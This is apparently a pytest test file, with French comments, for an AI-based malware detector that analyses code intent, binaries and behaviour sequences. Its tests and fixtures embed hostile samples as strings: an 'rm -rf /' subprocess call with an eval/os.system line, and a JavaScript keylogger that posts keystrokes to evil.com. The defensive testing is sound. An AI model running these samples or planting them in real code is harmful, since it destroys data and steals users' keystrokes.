"""
Tests pour les modèles IA
"""
import pytest
import tempfile
import os
from pathlib import Path
import sys
import numpy as np

# Ajouter le répertoire parent au path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ai_models import AIDetector, CodeIntentAnalyzer, BinaryAnalyzer, BehaviorAnalyzer, AIModelManager


class TestAIDetector:
    """Tests pour le détecteur d'anomalies"""
    
    def test_initialization(self):
        """Test l'initialisation du détecteur"""
        detector = AIDetector()
        assert detector.model is not None
        assert detector.vectorizer is not None
        assert detector.trained is False
    
    def test_feature_extraction(self):
        """Test l'extraction de caractéristiques"""
        detector = AIDetector()
        
        content = "print('Hello World')"
        features = detector.extract_features(content)
        
        assert len(features) > 0
        assert isinstance(features, np.ndarray)
        assert features[0] == len(content)  # Longueur
    
    def test_anomaly_detection_untrained(self):
        """Test la détection d'anomalie sans entraînement"""
        detector = AIDetector()
        
        is_anomaly, reason, confidence = detector.detect_anomaly("test content")
        
        assert is_anomaly is False
        assert "not trained" in reason.lower()
        assert confidence == 0.0
    
    def test_training_on_safe_files(self, temp_dir):
        """Test l'entraînement sur des fichiers sûrs (min. 10 requis par le modèle)"""
        detector = AIDetector()
        
        # Créer au moins 10 fichiers sûrs
        safe_files = []
        for i in range(15):
            file_path = Path(temp_dir) / f"safe_{i}.txt"
            file_path.write_text(f"This is safe content {i}")
            safe_files.append(str(file_path))
        
        success = detector.train_on_safe_files(safe_files)
        
        assert success is True
        assert detector.trained is True
    
    def test_anomaly_detection_trained(self, temp_dir):
        """Test la détection d'anomalie après entraînement"""
        detector = AIDetector()
        
        # Entraîner sur au moins 10 fichiers sûrs
        safe_files = []
        for i in range(15):
            file_path = Path(temp_dir) / f"safe_{i}.txt"
            file_path.write_text(f"Normal content {i}")
            safe_files.append(str(file_path))
        
        detector.train_on_safe_files(safe_files)
        
        # Test avec contenu normal
        is_anomaly, reason, confidence = detector.detect_anomaly("Normal content")
        assert is_anomaly is False  # Devrait être normal
        
        # Test avec contenu suspect
        suspicious_content = "eval('__import__(\"os\").system(\"dir\")')"
        is_anomaly, reason, confidence = detector.detect_anomaly(suspicious_content)
        # Peut être détecté comme anomalie ou non selon l'entraînement


class TestCodeIntentAnalyzer:
    """Tests pour l'analyseur d'intention de code"""
    
    def test_initialization(self):
        """Test l'initialisation de l'analyseur"""
        analyzer = CodeIntentAnalyzer()
        assert analyzer.malicious_patterns is not None
        assert len(analyzer.malicious_patterns) > 0
    
    def test_safe_code_analysis(self):
        """Test l'analyse de code sûr"""
        analyzer = CodeIntentAnalyzer()
        
        safe_code = """
def hello_world():
    print("Hello, World!")
    return "success"
"""
        
        result = analyzer.analyze_code_intent(safe_code)
        
        assert result['is_suspicious'] is False
        assert result['risk_score'] == 0.0
        assert result['risk_level'] == 'Low'
        assert len(result['detected_intents']) == 0
    
    def test_malicious_code_analysis(self):
        """Test l'analyse de code malveillant"""
        analyzer = CodeIntentAnalyzer()
        
        malicious_code = """
import os
import subprocess

def malicious():
    eval("__import__('os').system('dir')")
    subprocess.call(['rm', '-rf', '/'])
    return "done"
"""
        
        result = analyzer.analyze_code_intent(malicious_code)
        
        assert result['is_suspicious'] is True
        assert result['risk_score'] > 0.0
        assert 'system_commands' in result['detected_intents']
        assert len(result['intent_details']) > 0
    
    def test_keylogger_detection(self):
        """Test la détection de keylogger"""
        analyzer = CodeIntentAnalyzer()
        
        keylogger_code = """
document.addEventListener('keydown', function(e) {
    fetch('https://evil.com/log', {
        method: 'POST',
        body: JSON.stringify({key: e.key})
    });
});
"""
        
        result = analyzer.analyze_code_intent(keylogger_code)
        
        assert result['is_suspicious'] is True
        assert 'keylogging' in result['detected_intents']
        assert result['risk_score'] > 0.5


class TestBinaryAnalyzer:
    """Tests pour l'analyseur binaire"""
    
    def test_initialization(self):
        """Test l'initialisation de l'analyseur binaire"""
        analyzer = BinaryAnalyzer()
        assert analyzer.known_signatures is not None
        assert b'MZ' in analyzer.known_signatures
    
    def test_pe_executable_detection(self, temp_dir):
        """Test la détection d'exécutable PE"""
        analyzer = BinaryAnalyzer()
        
        # Créer un faux exécutable Windows
        pe_file = Path(temp_dir) / "test.exe"
        pe_content = b'MZ\x90\x00' + b'\x00' * 100  # Signature PE + padding
        pe_file.write_bytes(pe_content)
        
        result = analyzer.analyze_binary(str(pe_file))
        
        assert result['file_type'] == 'Windows PE'
        assert result['is_executable'] is True
        assert result['risk_score'] > 0.0
    
    def test_elf_executable_detection(self, temp_dir):
        """Test la détection d'exécutable ELF"""
        analyzer = BinaryAnalyzer()
        
        # Créer un faux exécutable Linux
        elf_file = Path(temp_dir) / "test"
        elf_content = b'\x7fELF\x02\x01' + b'\x00' * 100  # Signature ELF + padding
        elf_file.write_bytes(elf_content)
        
        result = analyzer.analyze_binary(str(elf_file))
        
        assert result['file_type'] == 'Linux ELF'
        assert result['is_executable'] is True
        assert result['risk_score'] > 0.0
    
    def test_entropy_calculation(self):
        """Test le calcul d'entropie"""
        analyzer = BinaryAnalyzer()
        
        # Données à faible entropie (très répétitives)
        low_entropy_data = b'A' * 1000
        entropy1 = analyzer._calculate_entropy(low_entropy_data)
        
        # Données à haute entropie (aléatoires)
        import random
        high_entropy_data = bytes([random.randint(0, 255) for _ in range(1000)])
        entropy2 = analyzer._calculate_entropy(high_entropy_data)
        
        assert entropy1 < entropy2
        assert 0 <= entropy1 <= 8
        assert 0 <= entropy2 <= 8


class TestBehaviorAnalyzer:
    """Tests pour l'analyseur comportemental"""
    
    def test_initialization(self):
        """Test l'initialisation de l'analyseur comportemental"""
        analyzer = BehaviorAnalyzer()
        assert analyzer.suspicious_sequences is not None
        assert len(analyzer.suspicious_sequences) > 0
    
    def test_safe_behavior_analysis(self):
        """Test l'analyse de comportement sûr"""
        analyzer = BehaviorAnalyzer()
        
        safe_operations = ['read', 'write', 'close']
        result = analyzer.analyze_behavior(safe_operations)
        
        assert result['risk_score'] < 0.5
        assert result['risk_level'] in ['Low', 'Medium']
        assert len(result['detected_patterns']) == 0
    
    def test_suspicious_behavior_analysis(self):
        """Test l'analyse de comportement suspect"""
        analyzer = BehaviorAnalyzer()
        
        suspicious_operations = [
            'create', 'write', 'execute', 'delete', 'create', 'write', 'execute', 'delete',
            'connect', 'send', 'receive', 'create_key', 'set_value'
        ]
        result = analyzer.analyze_behavior(suspicious_operations)
        
        assert result['risk_score'] > 0.5
        assert result['risk_level'] in ['Medium', 'High']
        assert len(result['detected_patterns']) > 0


class TestAIModelManager:
    """Tests pour le gestionnaire de modèles IA"""
    
    def test_initialization(self):
        """Test l'initialisation du gestionnaire"""
        manager = AIModelManager()
        
        assert manager.ai_detector is not None
        assert manager.code_analyzer is not None
        assert manager.binary_analyzer is not None
        assert manager.behavior_analyzer is not None
        assert manager.models_loaded is False
    
    def test_model_status(self):
        """Test l'obtention du statut des modèles"""
        manager = AIModelManager()
        status = manager.get_model_status()
        
        assert 'models_loaded' in status
        assert 'ai_detector_trained' in status
        assert 'code_analyzer_ready' in status
        assert 'binary_analyzer_ready' in status
        assert 'behavior_analyzer_ready' in status
        
        # Les analyseurs de code, binaire et comportement sont toujours prêts
        assert status['code_analyzer_ready'] is True
        assert status['binary_analyzer_ready'] is True
        assert status['behavior_analyzer_ready'] is True


# Fixtures pour les tests
@pytest.fixture
def temp_dir():
    """Crée un dossier temporaire pour les tests"""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield temp_dir


@pytest.fixture
def sample_safe_files(temp_dir):
    """Crée des fichiers sûrs pour les tests"""
    files = []
    
    # Fichier texte normal
    txt_file = Path(temp_dir) / "normal.txt"
    txt_file.write_text("This is a normal text file.")
    files.append(str(txt_file))
    
    # Fichier Python normal
    py_file = Path(temp_dir) / "normal.py"
    py_file.write_text("""
def hello():
    print("Hello, World!")
    return "success"
""")
    files.append(str(py_file))
    
    # Fichier JSON normal
    json_file = Path(temp_dir) / "data.json"
    json_file.write_text('{"name": "test", "value": 123}')
    files.append(str(json_file))
    
    return files


@pytest.fixture
def sample_malicious_files(temp_dir):
    """Crée des fichiers malveillants pour les tests"""
    files = []
    
    # Fichier Python malveillant
    py_file = Path(temp_dir) / "malicious.py"
    py_file.write_text("""
import os
import subprocess

def bad():
    eval("__import__('os').system('dir')")
    subprocess.call(['rm', '-rf', '/'])
""")
    files.append(str(py_file))
    
    # Fichier JavaScript malveillant
    js_file = Path(temp_dir) / "malicious.js"
    js_file.write_text("""
document.addEventListener('keydown', function(e) {
    fetch('https://evil.com/steal', {
        method: 'POST',
        body: e.key
    });
});
""")
    files.append(str(js_file))
    
    return files


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
